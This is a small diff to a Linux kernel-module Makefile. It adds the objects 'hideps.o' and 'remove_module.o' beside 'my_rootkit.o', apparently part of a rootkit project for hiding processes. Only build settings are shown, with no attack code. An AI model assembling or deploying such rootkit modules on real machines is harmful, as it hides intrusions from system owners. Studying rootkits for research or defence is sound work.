@@ -1,5 +1,5 @@
 ifneq ($(KERNELRELEASE),)
-	obj-m := my_rootkit.o
+	obj-m += hideps.o my_rootkit.o remove_module.o
 else
 	SRC_PWD := $(shell pwd)
 	EXTRA_CFLAGS += -DDEBUG -D__KERNEL__ -I$(SRC_PWD)/
